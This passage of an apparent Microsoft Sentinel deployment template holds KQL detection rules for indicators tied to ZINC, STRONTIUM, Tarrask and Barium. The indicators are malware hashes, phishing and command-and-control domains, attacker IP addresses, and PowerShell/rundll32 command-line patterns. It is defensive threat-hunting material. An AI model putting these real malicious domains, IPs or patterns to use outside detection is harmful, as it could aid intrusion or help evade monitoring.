bag_unpack(EventData)\n| extend Key=tostring(['@Name']), Value=['#text']\n| evaluate pivot(Key, any(Value), TimeGenerated, Source, EventLog, Computer, EventLevel, EventLevelName, UserName, RenderedDescription, MG, ManagementGroupName, Type, _ResourceId)\n| extend process = split(Image, '\\\\', -1)[-1]\n| where process =~ \"Microsoft.IdentityServer.ServiceHost.exe\"\n| distinct Computer\n)\n);\nlet ADFS_Servers =\nADFS_Servers1\n| union  (ADFS_Servers2 | distinct Computer);\n(union isfuzzy=true\n(DeviceNetworkEvents\n| where DeviceName in (ADFS_Servers)\n| where isnotempty(InitiatingProcessSHA256) or isnotempty(InitiatingProcessFolderPath)\n| where  InitiatingProcessSHA256 has_any (sha256Hashes) or InitiatingProcessFolderPath has_any (FilePaths)\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId,  InitiatingProcessParentFileName, InitiatingProcessFileName, RemoteIP, RemoteUrl, RemotePort, LocalIP, Type\n| extend timestamp = TimeGenerated, IPCustomEntity = RemoteIP, HostCustomEntity = DeviceName\n),\n(Event\n| where Source == \"Microsoft-Windows-Sysmon\" and EventID == '7'\n| where Computer in (ADFS_Servers)\n| extend EvData = parse_xml(EventData)\n| extend EventDetail = EvData.DataItem.EventData.Data\n| extend ImageLoaded = EventDetail.[5].[\"#text\"], Hashes = EventDetail.[11].[\"#text\"]\n| parse Hashes with * 'SHA256=' SHA256 '\",' *\n| where ImageLoaded has_any (FilePaths) or SHA256 has_any (sha256Hashes) \n| project TimeGenerated, EventDetail, UserName, Computer, Type, Source, SHA256, ImageLoaded, EventID\n| extend Type = strcat(Type,\":\",EventID, \": \", Source), Account = UserName, FileHash = SHA256, Image = EventDetail.[4].[\"#text\"] \n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = Account, ProcessCustomEntity = tostring(split(Image, '\\\\', -1)[-1]), AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = FileHash\n),\n(CommonSecurityLog\n| where FileHash in (sha256Hashes)\n| project TimeGenerated,  Message, SourceUserID, FileHash, Type\n| extend timestamp = TimeGenerated, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = FileHash\n),\n(DeviceEvents\n| where DeviceName in (ADFS_Servers)\n| extend FilePath = strcat(FolderPath, '\\\\', FileName)\n| where InitiatingProcessSHA256 has_any (sha256Hashes) or FilePath has_any (FilePaths)\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessSHA256, Type\n| extend Account = InitiatingProcessAccountName, Computer = DeviceName, CommandLine = InitiatingProcessCommandLine, FileHash = InitiatingProcessSHA256, Image = InitiatingProcessFolderPath\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = Account, ProcessCustomEntity = InitiatingProcessFileName, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = FileHash\n),\n(DeviceFileEvents\n| where DeviceName in (ADFS_Servers)\n| where FolderPath has_any (FilePaths) or SHA256 has_any (sha256Hashes)\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessSHA256, Type\n| extend Account = InitiatingProcessAccountName, Computer = DeviceName, CommandLine = InitiatingProcessCommandLine, FileHash = InitiatingProcessSHA256, Image = InitiatingProcessFolderPath\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = Account, ProcessCustomEntity = InitiatingProcessFileName, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = FileHash\n),\n(DeviceImageLoadEvents\n| where DeviceName in (ADFS_Servers)\n| where FolderPath has_any (FilePaths) or SHA256 has_any (sha256Hashes)\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessSHA256, Type\n| extend Account = InitiatingProcessAccountName, Computer = DeviceName, CommandLine = InitiatingProcessCommandLine, FileHash = InitiatingProcessSHA256, Image = InitiatingProcessFolderPath\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = Account, ProcessCustomEntity = InitiatingProcessFileName, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = FileHash\n),\n(Event\n| where Source == \"Microsoft-Windows-Sysmon\"\n| where Computer in (ADFS_Servers)\n| extend EvData = parse_xml(EventData)\n| extend EventDetail = EvData.DataItem.EventData.Data\n| parse EventDetail with * 'SHA256=' SHA256 '\",' *\n| where EventDetail has_any (sha256Hashes) \n| project TimeGenerated, EventDetail, UserName, Computer, Type, Source, SHA256\n| extend Type = strcat(Type, \": \", Source), Account = UserName, FileHash = SHA256, Image = EventDetail.[4].[\"#text\"] \n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = Account, ProcessCustomEntity = tostring(split(Image, '\\\\', -1)[-1]), AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = FileHash\n),\n(W3CIISLog \n| where ( csMethod == 'GET' and csUriStem has_any (GET_URI)) or (csMethod == 'POST' and csUriStem has_any (POST_URI))\n| summarize StartTime = max(TimeGenerated), EndTime = min(TimeGenerated), cIP_MethodCount = count() \nby cIP, cIP_MethodCountType = \"Count of repeated entries, this is to reduce rowsets returned\", csMethod, \ncsHost, scStatus, sIP, csUriStem, csUriQuery, csUserName, csUserAgent, csCookie, csReferer\n| extend timestamp = StartTime, IPCustomEntity = cIP, HostCustomEntity = csHost, AccountCustomEntity = csUserName\n),\n(imFileEvent\n| where DvcHostname in (ADFS_Servers)\n| where TargetFileSHA256 has_any (sha256Hashes) or FilePath has_any (FilePaths)\n| extend Account = ActorUsername, Computer = DvcHostname, IPAddress = SrcIpAddr, CommandLine = ActingProcessCommandLine, FileHash = TargetFileSHA256\n| project Type, TimeGenerated, Computer, Account, IPAddress, CommandLine, FileHash\n)\n)",
          "queryFrequency": "PT6H",
          "queryPeriod": "PT6H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Collection"
          ],
          "techniques": [
            "T1005"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "c37711a4-5f44-4472-8afc-0679bc0ef966",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            },
            {
              "entityType": "FileHash",
              "fieldMappings": [
                {
                  "identifier": "Algorithm",
                  "columnName": "AlgorithmCustomEntity"
                },
                {
                  "identifier": "Value",
                  "columnName": "FileHashCustomEntity"
                }
              ]
            },
            {
              "entityType": "Process",
              "fieldMappings": [
                {
                  "identifier": "ProcessId",
                  "columnName": "ProcessCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "2.1.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/c3ea7a83-2a0d-47e5-ad2d-a348ac363625')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/c3ea7a83-2a0d-47e5-ad2d-a348ac363625')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Known ZINC Comebacker and Klackring malware hashes",
          "description": "ZINC attacks against security researcher campaign malware hashes.",
          "severity": "High",
          "enabled": true,
          "query": "let tokens = dynamic([\"SSL_HandShaking\", \"ASN2_TYPE_new\", \"sql_blob_open\", \"cmsSetLogHandlerTHR\", \"ntSystemInfo\", \"SetWebFilterString\", \"CleanupBrokerString\", \"glInitSampler\", \"deflateSuffix\", \"ntWindowsProc\"]);\nlet DomainNames = dynamic(['codevexillium.org', 'angeldonationblog.com', 'investbooking.de', 'krakenfolio.com']);\nlet SHA256Hash = dynamic(['58a74dceb2022cd8a358b92acd1b48a5e01c524c3b0195d7033e4bd55eff4495','e0e59bfc22876c170af65dcbf19f744ae560cc43b720b23b9d248f4505c02f3e','3d3195697521973efe0097a320cbce0f0f98d29d50e044f4505e1fbc043e8cf9', '0a2d81164d524be7022ba8fd4e1e8e01bfd65407148569d172e2171b5cd76cd4', '96d7a93f6691303d39a9cc270b8814151dfec5683e12094537fd580afdf2e5fe','dc4cf164635db06b2a0b62d313dbd186350bca6fc88438617411a68df13ec83c', '46efd5179e43c9cbf07dcec22ce0d5527e2402655aee3afc016e5c260650284a', '95e42a94d4df1e7e472998f43b9879eb34aaa93f3705d7d3ef9e3b97349d7008', '9d5320e883264a80ea214077f44b1d4b22155446ad5083f4b27d2ab5bd127ef5', '9fd05063ad203581a126232ac68027ca731290d17bd43b5d3311e8153c893fe3', 'ada7e80c9d09f3efb39b729af238fcdf375383caaf0e9e0aed303931dc73b720', 'edb1597789c7ed784b85367a36440bf05267ac786efe5a4044ec23e490864cee', '33665ce1157ddb7cd7e905e3356b39245dfba17b7a658bdbf02b6968656b9998', '3ab770458577eb72bd6239fe97c35e7eb8816bce5a4b47da7bd0382622854f7c', 'b630ad8ffa11003693ce8431d2f1c6b8b126cd32b657a4bfa9c0dbe70b007d6c', '53f3e55c1217dafb8801af7087e7d68b605e2b6dde6368fceea14496c8a9f3e5', '99c95b5272c5b11093eed3ef2272e304b7a9311a22ff78caeb91632211fcb777', 'f21abadef52b4dbd01ad330efb28ef50f8205f57916a26daf5de02249c0f24ef', '2cbdea62e26d06080d114bbd922d6368807d7c6b950b1421d0aa030eca7e85da', '079659fac6bd9a1ce28384e7e3a465be4380acade3b4a4a4f0e67fd0260e9447']);\nlet SigNames = dynamic([\"Backdoor:Script/ComebackerCompile.A!dha\", \"Trojan:Win64/Comebacker.A!dha\", \"Trojan:Win64/Comebacker.A.gen!dha\", \"Trojan:Win64/Comebacker.B.gen!dha\", \"Trojan:Win32/Comebacker.C.gen!dha\", \"Trojan:Win32/Klackring.A!dha\", \"Trojan:Win32/Klackring.B!dha\"]);\n(union isfuzzy=true\n(CommonSecurityLog\n| parse Message with * '(' DNSName ')' * \n| where isnotempty(FileHash)\n| where FileHash in~ (SHA256Hash) or DNSName in~ (DomainNames)\n| extend Account = SourceUserID, Computer = DeviceName, IPAddress = SourceIP\n| project Type, TimeGenerated, Computer, Account, IPAddress, FileHash, DNSName\n),\n(_Im_Dns(domain_has_any=DomainNames)\n| extend DNSName = DnsQuery\n| extend Type = \"imDns\", IPAddress = SrcIpAddr, Computer=Dvc\n| project Type, TimeGenerated, Computer, IPAddress, DNSName\n),\n(VMConnection\n| parse RemoteDnsCanonicalNames with * '[\"' DNSName '\"]' *\n| where isnotempty(DNSName)\n| where DNSName  in~ (DomainNames)\n| extend IPAddress = RemoteIp\n| project Type, TimeGenerated, Computer, IPAddress, DNSName\n),\n(Event\n//This query uses sysmon data depending on table name used this may need updataing\n| where Source == \"Microsoft-Windows-Sysmon\"\n| extend EvData = parse_xml(EventData)\n| extend EventDetail = EvData.DataItem.EventData.Data\n| extend Hashes = EventDetail.[16].[\"#text\"]\n| where isnotempty(Hashes)\n| parse Hashes with * 'SHA256=' SHA256 ',' * \n| where SHA256 in~ (SHA256Hash) \n| extend Type = strcat(Type, \": \", Source), Account = UserName, FileHash = Hashes\n| project Type, TimeGenerated, Computer, Account, FileHash\n),\n(DeviceFileEvents\n| where SHA256 in~ (SHA256Hash)\n| extend Account = RequestAccountName, Computer = DeviceName, IPAddress = RequestSourceIP, CommandLine = InitiatingProcessCommandLine, FileHash = SHA256\n| project Type, TimeGenerated, Computer, Account, IPAddress, CommandLine, FileHash\n),\n(imFileEvent\n| where TargetFileSHA256 in~ (SHA256Hash)\n| extend Account = ActorUsername, Computer = DvcHostname, IPAddress = SrcIpAddr, CommandLine = ActingProcessCommandLine, FileHash = TargetFileSHA256\n| project Type, TimeGenerated, Computer, Account, IPAddress, CommandLine, FileHash\n),\n(DeviceNetworkEvents\n| where RemoteUrl in~ (DomainNames)\n| extend Computer = DeviceName, IPAddress = LocalIP, Account = InitiatingProcessAccountName\n| project Type, TimeGenerated, Computer, Account, IPAddress, RemoteUrl\n),\n(SecurityAlert\n| where ProductName == \"Microsoft Defender Advanced Threat Protection\"\n| extend ThreatName = tostring(parse_json(ExtendedProperties).ThreatName)\n| where isnotempty(ThreatName)\n| where ThreatName has_any (SigNames)\n| extend Computer = tostring(parse_json(Entities)[0].HostName) \n| project Type, TimeGenerated, Computer\n),\n(DeviceProcessEvents\n| where FileName =~ \"powershell.exe\" or FileName =~ \"rundll32.exe\"\n| where (ProcessCommandLine has \"is64bitoperatingsystem\" and ProcessCommandLine has \"Debug\\\\Browse\") or (ProcessCommandLine has_any (tokens))\n| extend Computer = DeviceName, Account = AccountName, CommandLine = ProcessCommandLine\n| project Type, TimeGenerated, Computer, Account, CommandLine, FileName\n),\n(SecurityEvent\n| where EventID == 4688\n| where ProcessName has_any (\"powershell.exe\", \"rundll32.exe\")\n| where (CommandLine has \"is64bitoperatingsystem\" and CommandLine has \"Debug\\\\Browse\") or (CommandLine has_any (tokens))\n| project Type, TimeGenerated, Computer, Account, ProcessName, CommandLine \n),\n( WindowsEvent\n| where EventID == 4688\n| where EventData has_any (\"powershell.exe\", \"rundll32.exe\") and EventData has_any (tokens, \"Debug\\\\Browse\",\"is64bitoperatingsystem\" ) \n| extend  ProcessName = tostring(EventData.ProcessName)\n| where ProcessName has_any (\"powershell.exe\", \"rundll32.exe\")\n| extend CommandLine = tostring(EventData.CommandLine)  \n| where (CommandLine has \"is64bitoperatingsystem\" and CommandLine has \"Debug\\\\Browse\") or (CommandLine has_any (tokens))\n| extend Account =  strcat(tostring(EventData.SubjectDomainName),\"\\\\\", tostring(EventData.SubjectUserName))\n| project Type, TimeGenerated, Computer, Account, ProcessName, CommandLine \n),\n(AzureDiagnostics \n| where ResourceType == \"AZUREFIREWALLS\"\n| where Category == \"AzureFirewallApplicationRule\"\n| parse msg_s with Protocol 'request from ' SourceHost ':' SourcePort 'to ' DestinationHost ':' DestinationPort '. Action:' Action\n| where isnotempty(DestinationHost)\n| where DestinationHost has_any (DomainNames)  \n| extend DNSName = DestinationHost \n| extend IPAddress = SourceHost\n)\n)\n| extend timestamp = TimeGenerated, AccountCustomEntity = Account, HostCustomEntity = Computer, IPCustomEntity = IPAddress",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl",
            "Execution"
          ],
          "techniques": [
            "T1071",
            "T1204"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "09551db0-e147-4a0c-9e7b-918f88847605",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.6.2"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/2348b9bd-24b5-45a1-bead-2316ea81dc17')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/2348b9bd-24b5-45a1-bead-2316ea81dc17')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Known STRONTIUM group domains - July 2019",
          "description": "Matches domain name IOCs related to Strontium group activity published July 2019 with CommonSecurityLog, DnsEvents and VMConnection dataTypes.\nReferences: https://blogs.microsoft.com/on-the-issues/2019/07/17/new-cyberthreats-require-new-ways-to-protect-democracy/.",
          "severity": "High",
          "enabled": true,
          "query": "let DomainNames = dynamic([\"irf.services\",\"microsoft-onthehub.com\",\"msofficelab.com\",\"com-mailbox.com\",\"my-sharefile.com\",\"my-sharepoints.com\",\n\"accounts-web-mail.com\",\"customer-certificate.com\",\"session-users-activities.com\",\"user-profile-credentials.com\",\"verify-linke.com\",\"support-servics.net\",\n\"onedrive-sharedfile.com\",\"onedrv-live.com\",\"transparencyinternational-my-sharepoint.com\",\"transparencyinternational-my-sharepoints.com\",\"soros-my-sharepoint.com\"]);\n(union isfuzzy=true\n  (CommonSecurityLog \n  | parse Message with * '(' DNSName ')' * \n  | extend Account = SourceUserID, Host = DeviceName, IPAddress = SourceIP\n  ),\n  (_Im_Dns(domain_has_any=DomainNames)\n  | extend IPAddress = SrcIpAddr, DNSName = DnsQuery, Host = Dvc),\n  (VMConnection \n  | parse RemoteDnsCanonicalNames with * '[\"' DNSName '\"]' *\n  | extend IPAddress = RemoteIp, Host = Computer\n  ),\n  (AzureDiagnostics \n  | where ResourceType == \"AZUREFIREWALLS\"\n  | where Category == \"AzureFirewallApplicationRule\"\n  | parse msg_s with Protocol 'request from ' SourceHost ':' SourcePort 'to ' DestinationHost ':' DestinationPort '. Action:' Action\n  | extend DNSName = DestinationHost \n  | extend IPAddress = SourceHost\n  ),\n  (\n    _Im_WebSession(url_has_any=DomainNames)\n    | extend IPCustomEntity=IpAddr, HostCustomEntity=Hostname, AccoutCustomEntity=User\n  )\n)\n| where isnotempty(DNSName)\n| where DNSName  has_any (DomainNames)\n| extend timestamp = TimeGenerated, IPCustomEntity = IPAddress, AccountCustomEntity = Account, HostCustomEntity = Host",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "074ce265-f684-41cd-af07-613c5f3e6d0d",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.4.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/5a32f6e7-4bce-45b7-9d6c-f6e75e7ead43')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/5a32f6e7-4bce-45b7-9d6c-f6e75e7ead43')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Tarrask malware IOC - April 2022",
          "description": "Identifies a hash match related to Tarrask malware across various data sources.\n Reference: https://www.microsoft.com/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/",
          "severity": "High",
          "enabled": true,
          "query": "let iocs = externaldata(DateAdded:string,IoC:string,Type:string,TLP:string) [@\"https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/Sample%20Data/Feeds/Tarrask.csv\"] with (format=\"csv\", ignoreFirstRecord=True);\nlet sha256Hashes = (iocs | where Type =~ \"sha256\" | project IoC);\n(union isfuzzy=true\n(CommonSecurityLog\n| where FileHash in (sha256Hashes)\n| project TimeGenerated, Message, SourceUserID, FileHash, Type\n| extend timestamp = TimeGenerated, FileHashCustomEntity = 'SHA256', Account = SourceUserID\n),\n(imFileEvent\n| where TargetFileSHA256 has_any (sha256Hashes)\n| extend Account = ActorUsername, Computer = DvcHostname, IPAddress = SrcIpAddr, CommandLine = ActingProcessCommandLine, FileHash = TargetFileSHA256\n| project Type, TimeGenerated, Computer, Account, IPAddress, CommandLine, FileHash\n),\n(Event\n| where Source == \"Microsoft-Windows-Sysmon\"\n| where EventID == 1\n| extend EvData = parse_xml(EventData)\n| extend EventDetail = EvData.DataItem.EventData.Data\n| extend Image = EventDetail.[4].[\"#text\"],  CommandLine = EventDetail.[10].[\"#text\"], Hashes = tostring(EventDetail.[17].[\"#text\"])\n| extend Hashes = extract_all(@\"(?P<key>\\w+)=(?P<value>[a-zA-Z0-9]+)\", dynamic([\"key\",\"value\"]), Hashes)\n| extend Hashes = column_ifexists(\"Hashes\", \"\"), CommandLine = column_ifexists(\"CommandLine\", \"\")\n| where (Hashes has_any (sha256Hashes) )  \n| project TimeGenerated, EventDetail, UserName, Computer, Type, Source, Hashes, CommandLine, Image\n| extend Type = strcat(Type, \": \", Source)\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = UserName, ProcessCustomEntity = tostring(split(Image, '\\\\', -1)[-1]), FileHashCustomEntity = Hashes\n),\n(DeviceEvents\n| where InitiatingProcessSHA256 has_any (sha256Hashes) or SHA256 has_any (sha256Hashes)\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessSHA256, Type\n| extend timestamp = TimeGenerated, HostCustomEntity = DeviceName , AccountCustomEntity = InitiatingProcessAccountName, ProcessCustomEntity = InitiatingProcessFileName, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = InitiatingProcessSHA256,  CommandLine = InitiatingProcessCommandLine,Image = InitiatingProcessFolderPath\n),\n(DeviceFileEvents\n| where SHA256 has_any (sha256Hashes)\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessSHA256, Type\n| extend timestamp = TimeGenerated, HostCustomEntity = DeviceName , AccountCustomEntity = InitiatingProcessAccountName, ProcessCustomEntity = InitiatingProcessFileName, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = InitiatingProcessSHA256,  CommandLine = InitiatingProcessCommandLine,Image = InitiatingProcessFolderPath\n),\n(DeviceImageLoadEvents\n| where SHA256 has_any (sha256Hashes)\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessSHA256, Type\n| extend timestamp = TimeGenerated, HostCustomEntity = DeviceName , AccountCustomEntity = InitiatingProcessAccountName, ProcessCustomEntity = InitiatingProcessFileName, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = InitiatingProcessSHA256,  CommandLine = InitiatingProcessCommandLine,Image = InitiatingProcessFolderPath\n)\n)",
          "queryFrequency": "PT12H",
          "queryPeriod": "PT12H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1053"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "caf78b95-d886-4ac3-957a-a7a3691ff4ed",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Process",
              "fieldMappings": [
                {
                  "identifier": "ProcessId",
                  "columnName": "ProcessCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "FileHash",
              "fieldMappings": [
                {
                  "identifier": "Algorithm",
                  "columnName": "AlgorithmCustomEntity"
                },
                {
                  "identifier": "Value",
                  "columnName": "FileHash"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/4d9acc97-7223-41fa-a75b-06e0d66f5959')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/4d9acc97-7223-41fa-a75b-06e0d66f5959')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Known Barium IP",
          "description": "Identifies a match across various data feeds for IP IOCs related to the Barium activity group.  \n References: https://www.justice.gov/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer' ",
          "severity": "High",
          "enabled": true,
          "query": "let IPList = dynamic([\"216.24.185.74\", \"107.175.189.159\", \"192.210.132.102\", \"67.230.163.214\", \n  \"199.19.110.240\", \"107.148.130.176\", \"154.212.129.218\", \"172.86.75.54\", \"45.61.136.199\", \n  \"149.28.150.195\", \"108.61.214.194\", \"144.202.98.198\", \"149.28.84.98\", \"103.99.209.78\", \n  \"45.61.136.2\", \"176.122.162.149\", \"192.3.80.245\", \"149.28.23.32\", \"107.182.18.149\", \"107.174.45.134\", \n  \"149.248.18.104\", \"65.49.192.74\", \"156.255.2.154\", \"45.76.6.149\", \"8.9.11.130\", \"140.238.27.255\", \n  \"107.182.24.70\", \"176.122.188.254\", \"192.161.161.108\", \"64.64.234.24\", \"104.224.185.36\", \n  \"104.233.224.227\", \"104.36.69.105\", \"119.28.139.120\", \"161.117.39.130\", \"66.42.100.42\", \"45.76.31.159\", \n  \"149.248.8.134\", \"216.24.182.48\", \"66.42.103.222\", \"218.89.236.11\", \"180.150.227.249\", \"47.75.80.23\",\n  \"124.156.164.19\", \"149.248.62.83\", \"150.109.76.174\", \"222.209.187.207\", \"218.38.191.38\", \n  \"119.28.226.59\", \"66.42.98.220\", \"74.82.201.8\", \"173.242.122.198\", \"45.32.130.72\", \"89.35.178.10\", \n  \"89.43.60.113\"]); \n(union isfuzzy=true \n(CommonSecurityLog \n| where isnotempty(SourceIP) or isnotempty(DestinationIP) \n| where SourceIP in (IPList) or DestinationIP in (IPList) or Message has_any (IPList) \n| extend IPMatch = case(SourceIP in (IPList), \"SourceIP\", DestinationIP in (IPList), \"DestinationIP\", \"Message\")  \n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated) by SourceIP, DestinationIP, DeviceProduct, DeviceAction, Message, Protocol, SourcePort, DestinationPort, DeviceAddress, DeviceName, IPMatch \n| extend timestamp = StartTimeUtc, IPCustomEntity = case(IPMatch == \"SourceIP\", SourceIP, IPMatch == \"DestinationIP\", DestinationIP, \"IP in Message Field\")  \n), \n(OfficeActivity \n|extend SourceIPAddress = ClientIP, Account = UserId \n| where  SourceIPAddress in (IPList) \n| extend timestamp = TimeGenerated , IPCustomEntity = SourceIPAddress , AccountCustomEntity = Account \n),\n(_Im_Dns (response_has_any_prefix=IPList)\n| extend DestinationIPAddress = ResponseName,  